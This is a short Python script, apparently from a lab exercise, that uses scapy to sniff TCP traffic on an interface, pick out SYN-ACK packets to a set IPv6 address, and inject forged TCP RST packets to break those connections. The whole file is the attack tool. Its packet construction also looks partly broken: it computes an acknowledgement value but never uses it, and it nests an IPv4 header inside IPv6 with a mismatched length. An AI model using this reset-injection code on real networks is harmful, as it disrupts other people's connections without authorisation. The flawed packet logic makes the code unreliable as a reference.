#!/usr/bin/env python3

from scapy.all import *




# The script sniffs the channel on ens34 and looks for TCP Sync-ACK packet,
# then crafts new TCP RST pcket and forwards it accordingly.

def packet_callback(packet):
    if TCP in packet and packet[IPv6].dst == "2001:db8:0:1::2" and packet[TCP].flags == 'SA':
        # Create the Ethernet layer
        eth = Ether(dst='00:0c:29:18:4c:dc', src='00:0c:29:47:e7:c0', type=IPv6)
        # Create the IPv6 layer
        ipv6 = IPv6(version=6, tc=0, fl=0, plen=20, nh=6, hlim=63, src='2001:db8:0:1::2', dst='2001:db8:2::2')
        ipv4 = IP(src='203.0.113.1', dst='192.0.2.2')
        pay_len = len(packet[TCP].payload)
        print(f"TCP packet payload length: {pay_len} bytes")
        ack_value =  pay_len+1
        print(f"New ack value: {ack_value}")
        src_port = packet[TCP].dport
        dst_port = packet[TCP].sport
        # Create the TCP layer with the RST flag set
        tcp = TCP(sport=src_port, dport=dst_port, seq=1, ack=1, window=29200, flags='R')

        # Create the packet by stacking the layers
        pkt = eth / ipv6 / ipv4 / tcp

        # Send the packet
        sendp(pkt, iface='ens34')

# Start sniffing on the specified interface
sniff(iface='ens34', prn=packet_callback, filter='tcp')
